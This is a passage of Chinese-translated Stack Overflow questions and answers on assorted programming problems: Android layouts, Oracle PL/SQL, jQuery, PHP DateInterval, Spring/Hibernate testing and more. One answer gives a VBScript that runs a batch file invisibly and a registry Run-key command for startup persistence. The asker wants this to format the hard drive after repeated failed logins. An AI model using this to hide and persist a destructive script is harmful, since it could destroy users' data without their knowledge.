            android:layout_height="wrap_content"
            android:layout_alignParentRight="true"
            android:prompt="@string/selectCity" />

        <TextView
            android:id="@+id/textView3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentLeft="true"
            android:layout_centerVertical="true"
            android:layout_marginLeft="14dp"
            android:text="@string/City"
            android:textColor="@color/dark_grey"
            android:textSize="18dp" />
    </RelativeLayout> 
```

我想要的是使微调器的背景透明但仍显示向下箭头。有什么办法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T09:34:48.200

创建xml文件并将其放在drawable文件夹中。

```
<?xml version="1.0" encoding="utf-8"?>
  <selector xmlns:android="http://schemas.android.com/apk/res/android">
  <item android:state_pressed="true"
       android:drawable="@drawable/slim_spinner_pressed" />
 <item android:drawable="@drawable/slim_spinner_normal" />
</selector> 
```

.

```
<Spinner ..... android:background="@drawable/selector_slim_spinner" ..... /> 
```

有关更多信息，请[在 Android 中查看此更改微调器样式](http://tech.chitgoks.com/2011/06/25/change-spinner-style-in-android/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:38:23.980

您应该创建一个选择器并将该选择器作为微调器的背景

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
     <item android:state_pressed="true"
           android:drawable="@drawable/..." />
     <item android:drawable="@drawable/..." />
</selector> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:42:36.440

您可以使用此资源[Android Holo Colors Generator](http://android-holo-colors.com/)生成 Android 组件，如 Android 4.0

# oracle - 如何在触发器中调用 PL/SQL 函数？

> ID：13490136
> 
> 赞同：3
> 
> 时间：2012-11-21T09:31:58.820
> 
> 标签：oracle

```
SQL> CREATE OR REPLACE TRIGGER INSERT_DATACOL
  2  AFTER insert ON FIELDWORKER_INFO for each row 
  3  declare
  4  FW NUMBER;
  5  begin 
  6  FW := datacol_insert_fwkr(:OLD.FIELDWORKER); 
  7  end; 
  8  /

Warning: Trigger created with compilation errors.

SQL> show err
Errors for TRIGGER INSERT_DATACOL:

LINE/COL ERROR
-------- -----------------------------------------------------------------
4/1      PL/SQL: Statement ignored
4/7      PLS-00201: identifier 'DATACOL_INSERT_FWKR' must be declared 
```

# c# - 如何隐藏 asp.net 向导控制步骤名称？

> ID：13490140
> 
> 赞同：2
> 
> 时间：2012-11-21T09:32:21.153
> 
> 标签：c#, javascript, asp.net, c#-4.0

我想在左栏中隐藏步骤名称。不想看到“Wizardstep1”、“Wizardstep2”和“Wizardstep3”。有人可以告诉我怎么做吗？

![在此处输入图像描述](../Images/2039561a77565e5e33d7fd9d31fb6bf1.png)

```
 <asp:Wizard runat="server" ID="MyWizard" OnNextButtonClick="MyWizard_NextButtonClick"
                        Width="640px" Height="200px" OnFinishButtonClick="MyWizard_FinishButtonClick">
                        <WizardSteps>
                        <asp:WizardStep ID="Wizardstep1" runat="server" StepType="Start">
                        </asp:WizardStep>
                        <asp:WizardStep ID="Wizardstep2" runat="server" StepType="Step">
                        </asp:WizardStep>
                        <asp:WizardStep ID="Wizardstep3" runat="server" StepType="Finish">
                        </asp:WizardStep>
     </asp:Wizard> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T09:42:04.097

有一个属性 DisplaySideBar 可以设置为 false。

```
<asp:Wizard runat="server" DisplaySideBar="false" ID="MyWizard" OnNextButtonClick="MyWizard_NextButtonClick" Width="640px" Height="200px" OnFinishButtonClick="MyWizard_FinishButtonClick">
     ....
</asp:Wizard> 
```

此外，可以为其设置自定义模板。如果上述方法不起作用，也许您可​​以将其设置为空：

```
<asp:Wizard runat="server" ID="MyWizard" OnNextButtonClick="MyWizard_NextButtonClick" Width="640px" Height="200px" OnFinishButtonClick="MyWizard_FinishButtonClick">
     <sidebartemplate>
     </sidebartemplate>
     ....
</asp:Wizard> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T09:42:38.977

尝试设置：

```
 <asp:WizardStep Title=""></asp:WizardStep> 
```

此外，[DisplaySideBar="false"](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.wizard.displaysidebar%28v=vs.100%29.aspx)

```
 <asp:Wizard DisplaySideBar="false"></asp:Wizard> 
```

# windows-7 - Windows 启动时在后台运行批处理文件并执行格式

> ID：13490141
> 
> 赞同：3
> 
> 时间：2012-11-21T09:32:23.180
> 
> 标签：windows-7, batch-file, startup, hard-drive

每次Windows启动时如何运行批处理文件我还需要在后台运行它我使用Windows 7。我的实际要求是我想检查用户输入10倍密码登录程序是否运行格式到硬盘。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:40:44.610

要隐藏运行它，您可以使用 VBScript（另存为`.vbs`文件）

```
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("C:\batchscript.bat"), 0, True 
```

要在启动时运行，您可以使用注册表启动 vbscript，这将在启动时在后台启动您的批处理文件。

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Script" /d "C:\script.vbs" /f 
```

不过，根据我的评论，我不得不问，如果他们输入错误的密码，你为什么要格式化他们的硬盘，为什么不简单的“你输入错误密码太多次”的消息？

# jquery - 按下转义键时如何隐藏元素？

> ID：13490143
> 
> 赞同：3
> 
> 时间：2012-11-21T09:32:43.740
> 
> 标签：jquery

我找到了以下用于创建覆盖的脚本，该覆盖在另一个页面中打开：

```
<script>
    $("a#selector").live("click", function(){
        $(".overlayInner").load("logwork_form.php",
        // the following is the callback   
        function(){$(".overlayOuter").fadeIn(300); });
    });
</script> 
```

我想请你帮我在脚本中添加一些额外的功能：在按下 esc 键时关闭覆盖。

我试过添加下面的代码，但它不起作用。

```
//close if esc key is pres
$(document).keyup(function(e) {
    if (e.keyCode == 27) {
        $(".overlayInner").close("logwork_form.php?proiect_id=13", function({
            $(".overlayOuter").fadeOut(300); 
}); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-21T09:36:43.950

由于未定义“close（）”并且缺少括号...

```
$(document).keyup(function(e) {
    if (e.which == 27) {
        $(".overlayInner").fadeOut(300); 
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:37:36.977

尝试下面的代码来获取密钥代码，然后放置一个 if 块作为转义密钥代码

```
 var keycode = (event.keyCode ? event.keyCode : event.which); 
```

以上行适用于所有主要浏览器。

# macros - LISP 中宏的谓词是什么

> ID：13490146
> 
> 赞同：4
> 
> 时间：2012-11-21T09:32:54.400
> 
> 标签：macros, lisp, predicate

有人知道要测试符号是否代表 lisp 中的宏的预测是什么吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-21T09:44:20.183

您可以使用[宏功能](http://www.lispworks.com/documentation/HyperSpec/Body/f_macro_.htm#macro-function)：

```
CL-USER> (defmacro foo () ''foo)
FOO
CL-USER> (defun bar () 'bar)
BAR
CL-USER> (macro-function 'foo)
#<Compiled-function FOO Macroexpander #x187F0026>
CL-USER> (macro-function 'bar)
NIL 
```

# asp.net-mvc-3 - 我将我的 mvc 视图移动到一个新文件夹，但我的应用程序不起作用

> ID：13490147
> 
> 赞同：0
> 
> 时间：2012-11-21T09:33:00.707
> 
> 标签：asp.net-mvc-3, view, directory

我将视图从文件夹视图移动到视图/管理器，当然，现在它们就像不存在一样。我在哪里可以更改视图的路径？似乎无法弄清楚。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:36:01.767

您可以在 Controller 中的相应 ActionResult 中指定将用于呈现的视图。

那行说：

```
retun View(model); 
```

只需使用另一个重载：

```
return View("/Views/Managers/[name of the view]", model) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:36:33.990

当您从您的操作方法返回视图时，您指定视图。

当视图被命名为您的操作并且位于正确的文件夹中时，足以说明

```
return View(); 
```

否则，您可以指定位置：

```
return View("MySubFolder/MyView"); 
```

# php - DateTime 格式参考 & 确定天到月

> ID：13490150
> 
> 赞同：0
> 
> 时间：2012-11-21T09:33:09.827
> 
> 标签：php, date, datetime

我曾经`DateTime`得到两个日期的差异。直接来自 PHP 文档示例：

```
$date1 = new DateTime('2012/03/15');
$date2 = new DateTime('2012/6/9');
$interval = $date1->diff($date2,true);
$days = $interval->format('%R%a days'); 
```

这将导致**`+86 days`**，我想知道我在哪里可以得到那些`%R%a`我不知道他们的意思的人的参考，但我只是通过看到那个`%R = +`而知道`%a is number of days`。

其次，现在通过拥有该值**`86`**，我至少可以拥有一个变量，我可以用它来说明这一点，`$date1`并且`$date2`不在 3 个月的长度内（3 个月至少是 90 天）。我可以简单地使用`if-else`它，但是为了精确起见，是否有另一种方法（内置 PHP 函数或库）来确定我拥有的价值在 3 个月内？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T09:37:18.833

[您也可以在文档](http://www.php.net/manual/en/dateinterval.format.php)中找到它：

```
%   Literal %   %
Y   Years, numeric, at least 2 digits with leading 0    01, 03
y   Years, numeric  1, 3
M   Months, numeric, at least 2 digits with leading 0   01, 03, 12
m   Months, numeric 1, 3, 12
D   Days, numeric, at least 2 digits with leading 0 01, 03, 31
d   Days, numeric   1, 3, 31
a   Total number of days as a result of a DateTime:diff() or (unknown) otherwise    4, 18, 8123
H   Hours, numeric, at least 2 digits with leading 0    01, 03, 23
h   Hours, numeric  1, 3, 23
I   Minutes, numeric, at least 2 digits with leading 0  01, 03, 59
i   Minutes, numeric    1, 3, 59
S   Seconds, numeric, at least 2 digits with leading 0  01, 03, 57
s   Seconds, numeric    1, 3, 57
R   Sign "-" when negative, "+" when positive   -, +
r   Sign "-" when negative, empty when positive -, 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T09:38:53.900

1.  检查文档以获取[`DateTime::diff`](http://php.net/manual/en/datetime.diff.php).
2.  看到它返回一个`DateInterval`，单击链接到[它的文档](http://php.net/manual/en/class.dateinterval.php)。
3.  阅读[其`format`方法](http://php.net/manual/en/dateinterval.format.php)的文档。

用于`if ($interval->format('%m') > 3)`测试是否超过三个月。请注意，这只是间隔的月份部分，例如“2 年，3 个月”中的“3”。还要考虑年份。你不应该只使用天数，因为一个月没有固定的天数。90天和3个月不是一回事。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T09:38:09.907

[http://www.php.net/manual/en/dateinterval.format.php](http://www.php.net/manual/en/dateinterval.format.php)用于文档

```
$months = 3;
if ($interval->format('%m') < $months) {
   echo "Less than $months months";
} 
```

# crystal-reports - 如何在 Crystal Reports 中显示来自存储过程的异常消息？

> ID：13490153
> 
> 赞同：0
> 
> 时间：2012-11-21T09:33:22.827
> 
> 标签：crystal-reports, oracle10g, oracle-xe

我有一个带有 Crystal Report 的应用程序，它使用 Oracle 的存储过程（我使用的是 Oracle 10g Express Edition）。截至目前，当存储过程引发异常时，例如“除以零”异常，该消息将显示在 CR 的警告框中。我想在报告中显示它，而不是数据。有什么办法吗？

```
EXCEPTION
    WHEN ZERO_DIVIDE THEN
        raise_application_error(-20001, 'Division by zero exception'); 
```

这就是我从存储过程中抛出异常的方式。然后我用 Data Expert 绑定了存储过程。我使用 REF CURSOR 将值从存储过程返回到 Crystal Report。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:01:37.550

在 Crystal Reports 中是否有任何方法可以捕获 SQL 异常？如果是这样，您可以获得 SQL 错误代码，并根据错误代码显示您想要的消息。

如果没有，请尝试以下方法，即在引发异常时返回错误代码和错误消息。

```
CREATE OR REPLACE PROCEDURE getemployees (
    p_no                  IN        employees.emp_number%TYPE,
    rcursor               OUT sys_refcursor,
    return_message    OUT VARCHAR2,
    return_code           OUT NUMBER
)
AS
BEGIN
    OPEN rcursor FOR
        SELECT  *
          FROM  employees
         WHERE  emp_number = p_no;

    return_message := NULL;
    return_code := 0;
EXCEPTION
    WHEN ZERO_DIVIDE
    THEN
        return_message := SQLERRM;
        return_code := SQLCODE;
END getemployees;
/ 
```

# jquery - 如何在 jquery 的同一 div 中保持移动（添加）图像？

> ID：13490156
> 
> 赞同：1
> 
> 时间：2012-11-21T09:33:29.840
> 
> 标签：jquery, image

大家好，我正在研究 jquery，我有一个 html 页面。在 html 中，我有两个 div，`firstdiv`现在 `image, name, and price`我们必须将图像移动（添加）到另一个 div 是空的 div 在这里我已经完成（移动）首先添加图像表单到 secound `but problem is`，当图像添加到第二个 div 图像应该出现在第一个 div 和第二个 div 中的同一个位置，我已经将图像添加到第二个 div 但图像从第一个 div 中删除这是我的代码如下：

```
 <div>              
                <span class="span1">
                <img src="~/Images/galaxy.jpeg" /></span> 
            <span class="span1">1232</span>
            <span class="span2">Cell Phone</span> 
            <span class="span1">3500</span>              
           <a href="#" class="pull-right" ><i class="icon-plus" onclick="AddToCart(this)" id="btnid" ></i></a>
        </div>

           <div class="span7" style="border:1px black" id="separat">
            </div> 
```

在上面的代码中，当我单击将图像添加到第二个 div 的按钮时，我有“图标加号”按钮，但我需要添加图像，它也应该出现在同一个地方

这是我的jQuery

```
 $(function () {             
       AddToCart(this);                
  });
    function AddToCart(obj) {
        var val = 0;
      var $this = $(obj).closest('div');
      var img = $this.find('img');
      var image=img;
      $('#separat').append(img);
      } 
```

有人可以帮我这样做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:43:23.377

尝试改变

```
$('#separat').append(img); 
```

到

```
$(img).clone().appendTo("#separat"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:45:16.367

你应该使用`clone()`

```
function AddToCart(obj) {
        var val = 0;
      var $this = $(obj).closest('div');
      var img = $this.find('img').clone();
      var image=img;
      $('#separat').append(img);
      } 
```

[http://api.jquery.com/clone/](http://api.jquery.com/clone/)

> .clone() 方法执行匹配元素集的深层复制，这意味着它复制匹配的元素以及它们的所有后代元素和文本节点。当与其中一种插入方法结合使用时，**.clone() 是一种在页面上复制元素的便捷方法。**

**更新**

如果你想获得奖品和名字

```
prize = $(obj).closest('.span2').clone();
name = $(obj).closest('.span1').clone();

$('#separat').append(img+prize+name); 
```

# python - 分析和解释python代码的工具

> ID：13490157
> 
> 赞同：4
> 
> 时间：2012-11-21T09:33:31.117
> 
> 标签：python, python-2.7

我正在通过阅读*Python Programming for the Absolute Beginner*一书来学习 Python 编程。随着我深入了解它，我发现它越来越难以遵循。

我想知道是否有一个工具能够运行我创建的任何 Python 代码，它会逐步遍历每一行并解释发生了什么？

[http://pythontutor.com/](http://pythontutor.com/)上有一个，但它只是在线的，因此（我认为）我无法获得输入功能来处理它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:36:41.540

```
import ipdb
ipdb.set_trace() 
```

并通过您的代码）

或者您可以使用带有更多图形的 pudb - [http://pypi.python.org/pypi/pudb](http://pypi.python.org/pypi/pudb)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:35:44.970

给自己一个IDE，我用的是Pycharm，然后你可以逐行逐行执行。

[皮查姆](http://www.jetbrains.com/pycharm/)

> 使用具有断点、步进、帧视图、监视和评估表达式的全功能调试器微调 Python 或 Django 应用程序和单元测试。

在调试视图中单步执行代码是非常宝贵的。当然，您可以通过其他方式做到这一点，但您可以在此软件上获得 30 天的免费试用期，看看您是否喜欢它。

当然还有其他类似的软件包可用。

# mysql - 优化 Mysql 查询（in 子句）

> ID：13490166
> 
> 赞同：3
> 
> 时间：2012-11-21T09:33:51.043
> 
> 标签：mysql, ruby-on-rails-3

```
SELECT 
    column1, 
    column2 
FROM `table` 
WHERE 
    column1 = '1 record' 
AND column2 IN ([Array of lacks record]) 
AND column3 IN ([thousands of records])) 
```

现在它需要 18 秒才能运行，它可以低于 5 秒。请提出任何替代查询。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:12:16.023

可能尝试将第 3 列的数千条记录放入临时表中，然后将现有表与临时表连接起来。使用大量 IN 子句保存。

如果第 3 列的内容来源是一个您可以对其进行联接的表，那就更好了。

# php - 致命错误：AdminUserRole::getAccessibleEmployeeIds() 的声明必须与 AbstractUserRole::getAccessibleEmployeeIds() 的声明兼容

> ID：13490172
> 
> 赞同：1
> 
> 时间：2012-11-21T09:34:04.137
> 
> 标签：php, symfony, orangehrm

我有一个使用 Symfony 用 PHP 编写的 Web 应用程序，我将它从本地计算机移动到远程服务器。当我尝试登录时，我收到了错误：

> 致命错误：AdminUserRole::getAccessibleEmployeeIds() 的声明必须与 AbstractUserRole::getAccessibleEmployeeIds() 的声明兼容

AdminUserRole 类

```
class AdminUserRole extends AbstractUserRole {

public function getAccessibleEmployeeIds($operation = null, $returnType = null, $requiredPermissions = array()) {

    return $this->getEmployeeService()->getEmployeeIdList(false);
}

public function getAccessibleEmployeePropertyList($properties, $orderField, $orderBy, $requiredPermissions = array()) {

    return $this->getEmployeeService()->getEmployeePropertyList($properties, $orderField, $orderBy, false);
}

public function getAccessibleEmployees($operation = null, $returnType = null, $requiredPermissions = array()) {

    $employees = $this->getEmployeeService()->getEmployeeList('empNumber', 'ASC', true);

    $employeesWithIds = array();

    foreach ($employees as $employee) {
        $employeesWithIds[$employee->getEmpNumber()] = $employee;
    }

    return $employeesWithIds;
}

public function getAccessibleLocationIds($operation, $returnType) {

    $locations = $this->getLocationService()->getLocationList();

    $ids = array();

    foreach ($locations as $location) {
        $ids[] = $location->getId();
    }

    return $ids;
}

public function getAccessibleOperationalCountryIds($operation, $returnType) {

    $operationalCountries = $this->getOperationalCountryService()->getOperationalCountryList();

    $ids = array();

    foreach ($operationalCountries as $country) {
        $ids[] = $country->getId();
    }

    return $ids;
}

public function getAccessibleSystemUserIds($operation, $returnType) {

    return $this->getSystemUserService()->getSystemUserIdList();
}

public function getAccessibleUserRoleIds($operation, $returnType) {

    $userRoles = $this->getSystemUserService()->getAssignableUserRoles();

    $ids = array();

    foreach ($userRoles as $role) {
        $ids[] = $role->getId();
    }

    return $ids;
} 
```

}

还有我的抽象课

```
abstract class AbstractUserRole {

protected $employeeService;
protected $systemUserService;
protected $operationalCountryService;
protected $locationService;

protected $userRoleManager;

protected $roleName;

public function __construct($roleName, $userRoleManager) {
    $this->userRoleManager = $userRoleManager;
    $this->roleName = $roleName;        
}

public function getSystemUserService() {
    if (empty($this->systemUserService)) {
        $this->systemUserService = new SystemUserService();
    }
    return $this->systemUserService;
}

public function setSystemUserService($systemUserService) {
    $this->systemUserService = $systemUserService;
}

public function getEmployeeService() {

    if (empty($this->employeeService)) {
        $this->employeeService = new EmployeeService();
    }
    return $this->employeeService;
}

public function setEmployeeService($employeeService) {
    $this->employeeService = $employeeService;
}

public function getLocationService() {
    if (empty($this->locationService)) {
        $this->locationService = new LocationService();
    }
    return $this->locationService;
}

public function setLocationService($locationService) {
    $this->locationService = $locationService;
}

public function getOperationalCountryService() {
    if (empty($this->operationalCountryService)) {
        $this->operationalCountryService = new OperationalCountryService();
    }
    return $this->operationalCountryService;
}

public function setOperationalCountryService($operationalCountryService) {
    $this->operationalCountryService = $operationalCountryService;
}

public function getAccessibleEntities($entityType, $operation = null, $returnType = null, $requiredPermissions = array()) {

    switch ($entityType) {
        case 'Employee':
            $entities = $this->getAccessibleEmployees($operation, $returnType, $requiredPermissions);
            break;
    }
    return $entities;
}

public function getAccessibleEntityProperties($entityType, $properties = array(), $orderField = null, $orderBy = null, $requiredPermissions = array()) {

    switch ($entityType) {
        case 'Employee':
            $propertyList = $this->getAccessibleEmployeePropertyList($properties, $orderField, $orderBy, $requiredPermissions);
            break;
    }
    return $propertyList;
}

public function getAccessibleEntityIds($entityType, $operation = null, $returnType = null, $requiredPermissions = array()) {   

    switch ($entityType) {
        case 'Employee':
            $ids = $this->getAccessibleEmployeeIds($operation, $returnType, $requiredPermissions);                
            break;
        case 'SystemUser':
            $ids = $this->getAccessibleSystemUserIds($operation, $returnType);
            break;
        case 'OperationalCountry':
            $ids = $this->getAccessibleOperationalCountryIds($operation, $returnType);
            break;
        case 'UserRole':
            $ids = $this->getAccessibleUserRoleIds($operation, $returnType);
            break;
        case 'Location':
            $ids = $this->getAccessibleLocationIds($operation, $returnType);
            break;
    }
    return $ids;
}

public abstract function getAccessibleEmployees($operation = null, $returnType = null, $requiredPermissions = array());

public abstract function getAccessibleEmployeePropertyList($properties, $orderField, $orderBy, $requiredPermissions = array());

public abstract function getAccessibleEmployeeIds($operation, $returnType, $requiredPermissions = array());

public abstract function getAccessibleSystemUserIds($operation, $returnType);

public abstract function getAccessibleOperationalCountryIds($operation, $returnType);

public abstract function getAccessibleUserRoleIds($operation, $returnType);

public abstract function getAccessibleLocationIds($operation, $returnType); 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:10:06.550

好吧，这两个函数签名不兼容。

```
abstract public function getAccessibleEmployeeIds($operation, $returnType, $requiredPermissions = array());
         public function getAccessibleEmployeeIds($operation = null, $returnType = null, $requiredPermissions = array()) { 
```

该`abstract`函数至少需要两个参数，而您的实现可以在没有参数的情况下调用。那不是同一个签名。删除`null`默认值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:15:05.963

你的方法声明是

```
public abstract function getAccessibleEmployeeIds($operation, $returnType, $requiredPermissions = array()); 
```

但实际的实现是

```
public function getAccessibleEmployeeIds($operation = null, $returnType = null, $requiredPermissions = array()); 
```

如您所见，原始声明至少需要 2 个参数，但您的实现突然说不需要任何参数。

您可能在服务器上的 PHP 中启用了严格模式，或者只是安装了具有更严格规则集的较新版本，强制实现与声明完全相同。

只需将代码更改`AdminUserRole.php`为

```
public function getAccessibleEmployeeIds($operation, $returnType, $requiredPermissions = array())
{
    return $this->getEmployeeService()->getEmployeeIdList(false);
} 
```

你会没事的。

# android - 如何设置叠加项目的地理点并正确放置在地图上？

> ID：13490176
> 
> 赞同：0
> 
> 时间：2012-11-21T09:34:26.857
> 
> 标签：android, map, overlayitem

![在此处输入图像描述](../Images/4c58b2c27d33fdd2c64087e0377b0cb5.png)

我想要的是在该行上方显示该项目。如何设置项目的位置？（如下图第二张所示）

![在此处输入图像描述](../Images/cdc8df5672e77e45f0d2591d954cec01.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T10:09:31.500

目前您的标记中心似乎已绑定到地理点，但您想绑定标记的底部。

所以在你的覆盖的构造函数中你需要调用[`boundCenterBottom`](https://developers.google.com/maps/documentation/android/v1/reference/com/google/android/maps/ItemizedOverlay#boundCenterBottom%28android.graphics.drawable.Drawable%29)这样的方法

```
public MyItemizedOverlay(Drawable defaultMarker) {
  super(boundCenterBottom(defaultMarker));
} 
```

并且可能您需要编辑标记图像以将底部中心的红点放置到图像的水平中心。

蓝色矩形是图像的近似大小。如您所见，标记的中心不在图像的中心。绿色矩形是如何更改图像以使标记的中心匹配图像的中心。

![在此处输入图像描述](../Images/607601e261663ebe288ed4c0d2047bc1.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:36:39.583

```
private List<Overlay> mapOverlays;

private Projection projection;  

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    linearLayout = (LinearLayout) findViewById(R.id.zoomview);
    mapView = (MapView) findViewById(R.id.mapview);
    mapView.setBuiltInZoomControls(true);

    mapOverlays = mapView.getOverlays();        
    projection = mapView.getProjection();
    mapOverlays.add(new MyOverlay());        

}

@Override
protected boolean isRouteDisplayed() {
    return false;
}

class MyOverlay extends Overlay{

    public MyOverlay(){

    }   

    public void draw(Canvas canvas, MapView mapv, boolean shadow){
        super.draw(canvas, mapv, shadow);

        Paint   mPaint = new Paint();
        mPaint.setDither(true);
        mPaint.setColor(Color.RED);
        mPaint.setStyle(Paint.Style.FILL_AND_STROKE);
        mPaint.setStrokeJoin(Paint.Join.ROUND);
        mPaint.setStrokeCap(Paint.Cap.ROUND);
        mPaint.setStrokeWidth(2);

        GeoPoint gP1 = new GeoPoint(19240000,-99120000);
        GeoPoint gP2 = new GeoPoint(37423157, -122085008);

        Point p1 = new Point();
        Point p2 = new Point();
        Path path = new Path();

        projection.toPixels(gP1, p1);
        projection.toPixels(gP2, p2);

        path.moveTo(p2.x, p2.y);
        path.lineTo(p1.x,p1.y);

        canvas.drawPath(path, mPaint);
    } 
```

# javascript - 应用重定向到另一个链接而不是页面标签应用。

> ID：13490177
> 
> 赞同：0
> 
> 时间：2012-11-21T09:34:44.347
> 
> 标签：javascript, facebook, facebook-javascript-sdk

我正在尝试从**Page Tab App**向使用 Javascript SDK 的朋友发送请求。代码如下所示。

```
 function sendRequestViaMultiFriendSelector() {
    FB.ui({method: 'apprequests',
      message: 'My Great Request'
    }, requestCallback);
  }

  function requestCallback(response) {
    // Handle callback here
  } 
```

用户收到请求，但被重定向到其他地方。他们被重定向到

[http://www.facebook.com/apps/application.php?id=537700179592094](http://www.facebook.com/) **_** _

代替：

[http://www.facebook.com/](http://www.facebook.com/) **pages** / *** */139287799553506?sk=app_537700179592094

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:22:34.190

这是预期的行为或请求功能。对于您的情况，您将需要构建一个单独的页面并将您的画布应用程序指向那里以处理必要的重定向到选项卡应用程序。

这样做的原因是因为应用程序可以安装在任意数量的页面上。Facebook 如何知道在接受请求后需要引导用户进行哪些安装。但是每个应用程序只有一个画布页面。

# qt - qt 应用程序运行时无法挂起嵌入式 linux

> ID：13490183
> 
> 赞同：2
> 
> 时间：2012-11-21T09:35:00.320
> 
> 标签：qt, embedded-linux, suspend

目前我正在开发一个在嵌入式平台（i.MX53）上运行的 Qt 应用程序。

我的问题是，当这个应用程序运行时，我无法让我的系统暂停。

我正在使用“busybox rtcwake”来管理挂起功能，我只想从我的 Qt 应用程序中运行它，因为这个应用程序是我系统的主要原因，但在调用 rtc 时我似乎无法让系统进入挂起状态唤醒：

```
//From Qt app.
Qstring str = "/bin/busybox rtcwake -d /dev/rtc0 -m standby -s 15";
system(str.toAscii()); 
```

这只是给我这个消息：

> 2012 年 6 月 24 日
> 下午 20:59:00 从“待机”唤醒：同步文件系统...完成。

这应该是这样的：

**这不是代码，但不知何故我无法提交，因为 SO 说它是代码。

```
wakeup from "standby" at Sun Jun 24 22:22:02 2012   
PM: Syncing filesystems ... done.   
Freezing user space processes ... (elapsed 0.01 seconds) done.  
Freezing remaining freezable tasks ... (elapsed 0.01 seconds) done.  
mxc_ipu mxc_ipu: Channel already disabled 9  
mxc_ipu mxc_ipu: Channel already uninitialized 9  
PM: suspend of devices complete after 28.942 msecs  
suspend wp cpu=400000000  
PM: late suspend of devices complete after 0.726 msecs 
```

因为这是当我在 qt 应用程序未运行时运行busybox 命令时所说的。

*注意：我正在运行 Linux：2.6.35.3-11.09.01

有谁知道可能是什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T12:38:40.020

问题是 QT 应用程序自己运行控制台，在我的情况下 tty0 正在停止我的挂起请求。

在我的情况下，由于我不通过 QWS 使用键盘或鼠标输入，我通过运行应用程序解决了这个问题：

```
qt_app_name -qws -nomouse -nokeyboard 
```

# spring - 使用 spring 和 hibernate 进行非事务性单元测试

> ID：13490186
> 
> 赞同：1
> 
> 时间：2012-11-21T09:35:13.697
> 
> 标签：spring, hibernate, unit-testing, transactions

嗨，我有一个单元测试应该测试一个 cronjob

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = { "file:WebContent/WEB-INF/applicationContext.xml" })
@TransactionConfiguration(transactionManager = "hibernateTransactionManager")
@Transactional
public class cronTest {} 
```

但由于事务的原因，cronjob 看不到测试的数据。但是当我删除@Transactional Hibernate 时说：

```
org.hibernate.HibernateException: No Session found for current thread 
```

当我自己承诺时

```
sessionFactory.getCurrentSession().getTransaction().commit();
sessionFactory.getCurrentSession().beginTransaction(); 
```

测试最终失败

```
org.springframework.transaction.TransactionSystemException: Could not commit Hibernate transaction; nested exception is org.hibernate.TransactionException: Transaction not successfully started 
```

如何在没有事务的情况下进行单元测试？

测试做了这样的事情：

```
 userDao.clear();
    loadeduser = userService.getUserById(createUser.getUserID());
    assertTrue(loadeduser.getAuthoritiesEntities().contains(adminRole));
    assertTrue(loadeduser.getAuthoritiesEntities().contains(userRole));

    // Wait for auto unsign
    TestUtils.sleep(10000);

    userDao.clear();
    loadeduser = userService.getUserById(createUser.getUserID());
    assertFalse(loadeduser.getAuthoritiesEntities().contains(adminRole));
    assertTrue(loadeduser.getAuthoritiesEntities().contains(userRole)); 
```

它检查过期角色的自动取消签名是否有效，石英作业每 5 秒运行一次

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T16:27:22.757

通常，我建议对可以在单个事务中测试的代码使用单元测试，并使用集成测试（启动整个系统并执行您想要测试的序列）来测试多事务行为。

但是要回答这个问题：解决此问题的一种方法是像您所做的那样从测试方法中删除 @Transaction ，而不是直接使测试方法控制事务，而是允许您正在测试的方法开始/提交自己的交易（他们通常会这样做，对吧？）

例如，我们可能有通过正常 DAO 工作流运行的测试，并且每个 DAO 方法都标记为@Transactional。每个方法都控制自己的事务提交，因此我们可以在单个测试方法中测试多事务行为。该测试可能如下所示：

```
// no @Transactional here, dao methods are @Transactional
public void testMultiTransactionUpdate() {
    Entity t = dao.getEntity(id);
    t.setProperty("somethingnew");
    dao.update(t);
    Entity t2 = dao.getEntity(id);
    Assert.assertEquals(t1.getProperty(), t2.getProperty());
} 
```

One thing to be careful of is that if you are committing against an in-memory database (like HSQLDB), your changes made in one test will not be automatically rolled back and will normally be visible to subsequent tests. You will have to manually undo all of your changes at the end of the test, or ensure that your test data does not interfere with other tests which is not so easy. That's why I would use this technique sparingly.

# ruby - Ruby 在虚拟机上运行缓慢，具体取决于虚拟化引擎

